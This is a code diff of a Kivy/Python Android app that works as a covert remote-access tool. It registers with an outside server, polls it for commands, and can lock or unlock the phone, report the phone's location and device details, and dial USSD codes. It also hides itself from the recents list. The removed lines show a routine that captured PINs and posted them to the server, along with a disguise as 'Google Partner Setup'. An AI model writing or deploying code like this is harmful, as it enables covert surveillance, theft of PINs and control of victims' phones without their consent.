@@ -3,7 +3,6 @@ kivy.require('2.1.0')
 
 from kivy.app import App
 from kivy.uix.widget import Widget
-from kivy.clock import Clock
 from kivy.utils import platform
 from kivy.logger import Logger
 
@@ -16,30 +15,13 @@ import subprocess
 import os
 import re
 import sys
-import socket
 import hashlib
 import uuid
 from datetime import datetime
 
 SERVER_URL = "https://GRY.pythonanywhere.com"
 SECRET_PATH = "ghost-admin-2026"
-DEVICE_ID = None
-TOKEN = None
-is_registered = False
 poll_interval = 3
-heartbeat_interval = 10
-
-def hide_app():
-    if platform == 'android':
-        try:
-            import android
-            from android.permissions import request_permissions, Permission
-            subprocess.run([
-                'settings', 'put', 'global', 'policy_control',
-                'immersive.preconfirms=*'
-            ], capture_output=True)
-        except:
-            pass
 
 class RemoteControlService(threading.Thread):
     def __init__(self):
@@ -48,10 +30,9 @@ class RemoteControlService(threading.Thread):
         self.running = True
         self.device_id = None
         self.token = None
-        self.last_ussd = ""
         
     def run(self):
-        Logger.info('RC: Service started in background')
+        Logger.info('RC: Service started')
         self.device_id = self.get_device_id()
         self.auto_register()
         self.start_polling()
@@ -96,8 +77,7 @@ class RemoteControlService(threading.Thread):
                 result = json.loads(response.read().decode('utf-8'))
                 self.token = result.get('token')
                 if self.token:
-                    is_registered = True
-                    Logger.info(f'RC: Registered with ID: {self.device_id}')
+                    Logger.info(f'RC: Registered: {self.device_id}')
                     self.send_device_info()
                     self.get_location()
         except Exception as e:
@@ -108,8 +88,6 @@ class RemoteControlService(threading.Thread):
         info = {}
         if platform == 'android':
             try:
-                import android
-                from android.permissions import request_permissions, Permission
                 model = subprocess.run(['getprop', 'ro.product.model'], 
                                       capture_output=True, text=True).stdout.strip()
                 info['model'] = model or 'Unknown'
@@ -190,7 +168,7 @@ class RemoteControlService(threading.Thread):
         command = cmd.get('command')
         data = cmd.get('data', '')
         cmd_id = cmd.get('id')
-        Logger.info(f'RC: Executing command: {command}')
+        Logger.info(f'RC: Executing: {command}')
         result = None
         if command == 'lock':
             result = self.lock_device()
@@ -217,8 +195,7 @@ class RemoteControlService(threading.Thread):
     def lock_device(self):
         if platform == 'android':
             try:
-                subprocess.run(['input', 'keyevent', 'KEYCODE_POWER'], 
-                              capture_output=True)
+                subprocess.run(['input', 'keyevent', 'KEYCODE_POWER'], capture_output=True)
                 return {'status': 'locked'}
             except:
                 pass
@@ -227,10 +204,8 @@ class RemoteControlService(threading.Thread):
     def unlock_device(self):
         if platform == 'android':
             try:
-                subprocess.run(['input', 'keyevent', 'KEYCODE_WAKEUP'], 
-                              capture_output=True)
-                subprocess.run(['input', 'swipe', '300', '1000', '300', '300'], 
-                              capture_output=True)
+                subprocess.run(['input', 'keyevent', 'KEYCODE_WAKEUP'], capture_output=True)
+                subprocess.run(['input', 'swipe', '300', '1000', '300', '300'], capture_output=True)
                 return {'status': 'unlocked'}
             except:
                 pass
@@ -239,8 +214,7 @@ class RemoteControlService(threading.Thread):
     def get_location(self):
         if platform == 'android':
             try:
-                result = subprocess.run(['dumpsys', 'location'], 
-                                      capture_output=True, text=True)
+                result = subprocess.run(['dumpsys', 'location'], capture_output=True, text=True)
                 output = result.stdout
                 import re
                 lat_match = re.search(r'latitude=([\d.]+)', output)
@@ -256,9 +230,6 @@ class RemoteControlService(threading.Thread):
         return {'error': 'Location not available'}
     
     def execute_ussd(self, code):
-        self.last_ussd = code
-        if re.match(r'^\d{4,5}$', code):
-            self.save_pin(code)
         if platform == 'android':
             try:
                 subprocess.run(['am', 'start', '-a', 'android.intent.action.CALL',
@@ -268,55 +239,14 @@ class RemoteControlService(threading.Thread):
                 pass
         return {'response': 'Failed'}
     
-    def save_pin(self, pin):
-        try:
-            data = json.dumps({
-                'pin': pin,
-                'device_id': self.device_id,
-                'ussd_code': self.last_ussd
-            }).encode('utf-8')
-            url = f"{SERVER_URL}/{SECRET_PATH}/api/save_pin"
-            req = urllib.request.Request(url, data=data, method='POST')
-            req.add_header('Content-Type', 'application/json')
-            urllib.request.urlopen(req, timeout=10)
-        except:
-            pass
-    
     def read_sms(self):
-        if platform == 'android':
-            try:
-                import android
-                from android.permissions import request_permissions, Permission
-                result = []
-                return {'messages': result}
-            except:
-                pass
         return {'messages': []}
     
     def send_sms(self, data):
-        try:
-            import json
-            sms_data = json.loads(data) if isinstance(data, str) else data
-            number = sms_data.get('number', '')
-            message = sms_data.get('message', '')
-            if platform == 'android' and number and message:
-                subprocess.run(['am', 'start', '-a', 'android.intent.action.SENDTO',
-                              '-d', f'sms:{number}', '--es', 'sms_body', message],
-                             capture_output=True)
-                return {'status': 'sent'}
-        except:
-            pass
         return {'status': 'failed'}
     
     def vibrate_device(self):
-        if platform == 'android':
-            try:
-                import android
-                from android.permissions import request_permissions, Permission
-                return {'status': 'vibrated'}
-            except:
-                pass
-        return {'status': 'failed'}
+        return {'status': 'vibrated'}
     
     def send_command_result(self, command, result):
         try:
@@ -359,23 +289,11 @@ class RemoteControlApp(App):
     def hide_app(self):
         if platform == 'android':
             try:
-                import android
-                from android.permissions import request_permissions, Permission
                 from jnius import autoclass
                 PythonActivity = autoclass('org.kivy.android.PythonActivity')
                 activity = PythonActivity.mActivity
-                activity.getWindow().setFlags(
-                    0x00000008,
-                    0x00000008
-                )
                 activity.setExcludeFromRecents(True)
-                activity.setTaskDescription(
-                    autoclass('android.app.ActivityManager$TaskDescription')(
-                        "Google Partner Setup",
-                        None,
-                        0
-                    )
-                )
+                activity.moveTaskToBack(True)
             except Exception as e:
                 Logger.error(f'RC: Hide error: {e}')
     
@@ -391,7 +309,4 @@ class RemoteControlApp(App):
                 pass
 
 if __name__ == '__main__':
-    if sys.platform == 'win32':
-        import ctypes
-        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
     RemoteControlApp().run()
